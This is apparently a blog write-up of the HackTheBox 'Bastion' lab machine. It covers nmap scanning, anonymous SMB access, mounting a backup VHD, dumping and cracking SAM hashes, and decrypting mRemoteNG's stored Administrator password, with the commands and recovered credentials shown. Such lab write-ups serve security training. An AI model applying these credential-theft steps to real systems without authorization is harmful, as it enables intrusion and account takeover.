---
layout:     post
title:      Bastion (HTB)
date:       2019-10-05 12:00:00
summary:    Write-up of HackTheBox's Bastion.
categories: writeup
thumbnail: fort-awesome
tags:
 - hackthebox
 - writeup
 - walkthrough

---

![](/images/bastion/infocard.png)

Bastion is a relatively straightforward box with one strange quirk: to enumerate appropriately, you have to mount a VHD within an SMB share (that you also have to mount...). It isn't difficult to do these things, but it does take some creative thinking to consider. Privilege escalation leverages the insecure manner in which mRemoteNG stores credentials. You can exploit this in a couple of cool ways through the mRemoteNG GUI itself—or, you can opt for the quick (but forgettable) Python script that wasn't available until _after_ the box was released.

# Initial Scan

{% highlight plaintext %}
root@kali:~# nmap -sV -sC 10.10.10.134 -oA bastion.nmap                                                                 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-22 08:26 EDT
Nmap scan report for 10.10.10.134
Host is up (0.053s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -32m09s, deviation: 1h09m14s, median: 7m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-22T14:34:30+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-22 08:34:28
|_  start_date: 2019-09-22 08:32:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds
{% endhighlight %}

Not much to look into aside from SMB.

# Enumerating SMB

It's always worth testing to see if SMB permits null (aka anonymous) sessions. __We need a share__ to try authenticating to first. So I list out the shares.

{% highlight plaintext %}
root@kali:~# smbclient -L \\10.10.10.134
Enter WORKGROUP\root's password:
    Sharename       Type      Comment                                                                                           
    ---------       ----      -------                                                                                           
    ADMIN$          Disk      Remote Admin                                                                                      
    Backups         Disk                                                                                                        
    C$              Disk      Default share                                                                                     
    IPC$            IPC       Remote IPC 
    
{% endhighlight %}

`ADMIN$`, `C$`, and `IPC$` are all default shares. `Backups` is the only one that stands out. I attempt to authenticate to it with no credentials.

{% highlight plaintext %}
root@kali:~# smbclient \\\\10.10.10.134\\Backups
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

                7735807 blocks of size 4096. 2745314 blocks available

{% endhighlight %}

My null session worked. I have read access to the `Backups` share.

Although there aren't that many files in the share, some are massive. Here's a quick look of the interesting directory `WindowsImageBackup`.

{% highlight plaintext %}
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                   D        0  Fri Feb 22 07:45:32 2019                                                          
  ..                                  D        0  Fri Feb 22 07:45:32 2019                                                          
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 07:44:03 2019                                                
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 07:45:32 2019                                              
  BackupSpecs.xml                     A     1186  Fri Feb 22 07:45:32 2019
                                                            
  < . . . snip . . . >

{% endhighlight %}

Virtual hard disks? Definitely something to look at. But `5418299392` blocks? That's over two terabytes. We need a way to enumerate the VHDs without downloading them entirely.

# Mounting shares and VHD files

If I mount the share, I can view it as if it were part of my own file system.

{% highlight plaintext %}
root@kali:~# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
Password for anonymous@//10.10.10.134/Backups:  
{% endhighlight %}

![](/images/bastion/image2.png)

The VHDs, though, aren't readable this way. To browse through them, I have to mount those as well. For VHD files, I have to first install `guestmount`.

{% highlight plaintext %}
root@kali:~# apt-get install libguestfs-tools
{% endhighlight %}

Then I create a new directory as the mountpoint.

{% highlight plaintext %}
root@kali:~# mkdir vhd1
{% endhighlight %}

And I mount the VHD file.

{% highlight plaintext %}
root@kali:~# guestmount --add "/root/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/vhd1 -v
{% endhighlight %}

Now I can browse through the file system as if it were part of my own.

![](/images/bastion/image3.png)

_Note: One of the VHDs wouldn't mount properly. Turns out it isn't necessary to mount anyway._

Now with read access to the VHD, my first instinct is to go for the __flags__, but there's nothing at `C:\Users\L4mpje\Desktop` or `C:\Users\Administrator\Desktop`. So I clearly don't have the right access just yet.

Next thing to do would be to search for __user credentials__. After checking for credentials lying around in obvious places, I go for the SAM and SECURITY files.

# SAM and SECURITY

Depending on your version of Windows, these can be in a few different locations. Here, they're in `C:\Windows\System32\config`.

{% highlight plaintext %}
root@kali:~/vhd1/Windows/System32/config# dir
< . . . snip . . . >
SAM
SAM.LOG
SAM.LOG1
SAM.LOG2
SECURITY
< . . . snip . . . >
{% endhighlight %}

I copy them from the mounted drive to my Kali box.

{% highlight plaintext %}
root@kali:~/vhd1/Windows/System32/config# cp SAM ~
root@kali:~/vhd1/Windows/System32/config# cp SYSTEM ~
{% endhighlight %}

To get the hashes, I use `samdump2` and pass the `SYSTEM` and `SAM` files as arguments.

{% highlight plaintext %}
root@kali:~# samdump2 SYSTEM SAM -o hashes.txt
root@kali:~# cat hashes.txt
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
{% endhighlight %}

The L4mpje hash takes seconds to crack with `hashcat`.

{% highlight plaintext %}
root@kali:~# hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
{% endhighlight %}

The password for use L4mpje is __bureaulampje__. The Administrator and Guest account hashes are marked as `*disabled*`, so this is the best we'll get.

![](/images/bastion/image4.png)

To get in, I `ssh` as __L4mpje@10.10.10.134__ with the recovered password.

{% highlight plaintext %}
root@kali:~# ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

l4mpje@BASTION C:\Users\L4mpje>    
{% endhighlight %}

The user flag is on L4mpje's Desktop.

{% highlight plaintext %}
l4mpje@BASTION C:\Users\L4mpje>type Desktop\user.txt                            
9bfe############################                                                   
{% endhighlight %}

# Privilege Escalation: mRemoteNG Credentials

With Windows privilege escalation, if nothing stands out in the Users folder, I move on to checking what software is installed. Here, `mRemoteNG` stands out.

{% highlight plaintext %}
l4mpje@BASTION C:\>dir "Program Files (x86)"                                    
 Volume in drive C has no label.                                                
 Volume Serial Number is 0CB3-C487                                              

 Directory of C:\Program Files (x86)                                            

22-02-2019  15:01    <DIR>          .                                           
22-02-2019  15:01    <DIR>          ..                                          
16-07-2016  15:23    <DIR>          Common Files                                
23-02-2019  10:38    <DIR>          Internet Explorer                           
16-07-2016  15:23    <DIR>          Microsoft.NET                               
22-02-2019  15:01    <DIR>          mRemoteNG                                   
23-02-2019  11:22    <DIR>          Windows Defender                            
23-02-2019  10:38    <DIR>          Windows Mail                                
23-02-2019  11:22    <DIR>          Windows Media Player                        
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                 
16-07-2016  15:23    <DIR>          Windows NT                                  
23-02-2019  11:22    <DIR>          Windows Photo Viewer                        
16-07-2016  15:23    <DIR>          Windows Portable Devices                    
16-07-2016  15:23    <DIR>          WindowsPowerShell                           
               0 File(s)              0 bytes                                   
              14 Dir(s)  11.244.994.560 bytes free                              
{% endhighlight %}

I can find the version number in the changelog file and search for a known exploit, but this doesn't get us very far. 

A search for "mRemoteNG stored credentials", however, results in [exactly what we're looking for](http://hackersvanguard.com/mremoteng-insecure-password-storage/):

> mRemoteNG uses insecure methods for password storage and can provide droves of valid credentials during an assessment or competition.

As the post explains, mRemoteNG is used to help manage remote connections (e.g., SSH, RDP). Credentials for these sessions may be stored insecurely in a file called `confCons.xml`. Lo and behold, I can find an encrypted password (right beside __Username="Administrator"__) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.

{% highlight xml %}
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" . . . 
{% endhighlight %}

This specifies that the protocol is RDP. We can assume that this credential would be reused for SSH as well. We can abuse these stored credentials in a few different ways.

### Method 1: Extended Tools password lookup

The previously linked-to [blog post](http://hackersvanguard.com/mremoteng-insecure-password-storage/) describes a method via the GUI, which seems to be the intended way in this box. I switch over to a Windows VM, download mRemoteNG, and start it up.

![](/images/bastion/image10.PNG)

I import the confCons.xml file by going to __File > Open Connection File...__ I see two saved connections.

![](/images/bastion/image11.PNG)

"DC" is the one we're after. This is the stored Administrator RDP connection.

![](/images/bastion/image12.PNG)

The [blog post](http://hackersvanguard.com/mremoteng-insecure-password-storage/) explains that I need to create a new Extended Tool that acts as a password decrypter. I go to __Tools > External Tools__ and click __New__.

* Display Name can be anything really. (I put `Password Lookup` per the blog.)
* Filename should be `CMD`.
* Arguments should be `/k echo %password%`.
<br>
<br>
![](/images/bastion/image13.PNG)

Once the tool is created, I right-click the connection (DC) and select __External Tools > Password Lookup__. A command prompt appears with the password in cleartext.

![](/images/bastion/image14.PNG)

With these credentials, I can SSH in as Administrator . . . 

{% highlight plaintext %}
root@kali:~# ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password: 
{% endhighlight %}

. . . and grab the flag.

{% highlight plaintext %}
administrator@BASTION C:\Users\Administrator> type Desktop\root.txt                                                             
9588############################
{% endhighlight %}

### Method 2: Connecting directly from mRemoteNG

We actually don't have to uncover the password at all to get Administrator access. If you've started up mRemoteNG and imported confCons.xml, just:

* Change the IP address from 127.0.0.1 to 10.10.10.134.
* Change the connection method from RDP to SSH version 2. (Our nmap scan showed SSH but not RDP.)
<br>
<br>
![](/images/bastion/image16.PNG)

Right-click the connection (DC) from the connections list, click __Connect__, and you'll have an interactive SSH session as Administrator.

![](/images/bastion/image17.PNG)

### Method 3: Decrypting with mremoteng_decrypt.py

Sometime after the box was released, a neat script called [mRemoteNG_Decrypt.py](https://github.com/haseebT/mRemoteNG-Decrypt) popped up. All you have to do is copy the encrypted password from confCons.xml and pass it as a string to get the plaintext credential.

{% highlight plaintext %}
root@kali:~# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
{% endhighlight %}

Not as satisfying as the other methods, but it's always good to have a quick-and-dirty way that doesn't involve spinning up a separate Windows environment and installing software.